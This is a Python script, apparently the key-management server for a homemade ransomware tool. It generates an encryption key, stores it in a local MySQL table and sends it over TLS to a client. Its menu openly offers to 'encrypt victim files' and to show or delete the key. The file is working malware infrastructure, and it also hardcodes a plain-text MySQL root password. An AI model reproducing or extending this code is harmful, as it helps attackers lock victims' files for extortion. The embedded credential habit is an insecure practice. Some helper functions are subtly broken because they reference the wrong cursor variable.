import socket
import mysql.connector # Library for connecting to a mysql service on this computer, sqlite3 is for local file databases
import ssl
import os
from pathlib import Path
import secrets

def generate_key():
    return secrets.token_bytes(32).hex()

def create_database(cur):
    cur.execute("CREATE DATABASE mydatabase")

def show_databases(cur):
    cur.execute("SHOW DATABASES")
    for x in mycursor:
        print(x)

def create_table(cur):
    cur.execute("CREATE TABLE table_keys (id INT AUTO_INCREMENT PRIMARY KEY, col_key VARCHAR(255))")

def show_tables(cur):
    mycursor.execute("SHOW TABLES")
    for x in mycursor:
        print(x)

def insert_key(cur, ke):
    sql = "INSERT INTO table_keys (col_key) VALUES (%s)"
    val = (ke, )
    cur.execute(sql, val)

def send_key_to_client(cur, server_host, server_port):
    k = generate_key()
    insert_key(cur, k)
    print(f"Testing, key: {k}")

    s = socket.socket()
    s.bind((server_host, server_port))
    s.listen(1)

    print(f"Server is listening on {server_host}:{server_port}...")

    client , addr = s.accept()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
    ssl_connection = context.wrap_socket(client, server_side=True)

    print(f"Connection established with {addr}")

    ssl_connection.sendall(k.encode("utf-8"))

    print("Key sent. Closing connection.")
    
    s.close()

def get_key_from_db(cur):
    cur.execute("SELECT col_key FROM table_keys LIMIT 1")
    res = cur.fetchone()
    if res:
        return res[0]

def get_and_del_key(cur):
    k = get_key_from_db(cur)
    com = "DELETE FROM table_keys WHERE col_key = %s"
    cur.execute(com, (k, ))
    print(f"Key deleted: {k}")
    return k

dataBase = mysql.connector.connect(
  host ="localhost",                # Localhost for local connection
  user ="root",
  passwd ="n,GDgw+T/?:4dh#",
  database = "mydatabase" # Connect to the database mydatabase, it already
)

if __name__ == "__main__":
    os.chdir(Path(__file__).resolve().parent) # Change directory to this script's directory

    mycursor = dataBase.cursor()
    while True:
        choice = input("Send key and encrypt victim files(1), show key(2), delete key(3, or exit(4)? ").strip()
        if choice == "1":
            send_key_to_client(mycursor, "127.0.0.1", 8080) # generating and sending key to client through ssl
            dataBase.commit()
        elif choice == "2":
            print(get_key_from_db(mycursor)) # print key without deleting
        elif choice == "3":
            verify = input("Are you sure?(y - yes, n - no) ").strip().lower()
            if verify == "y":
                print(get_and_del_key(mycursor)) # print and delete key
                dataBase.commit()
            else:
                continue
        elif choice == "4":
            break
        else:
            print("Invalid choice.")
            continue
    dataBase.close()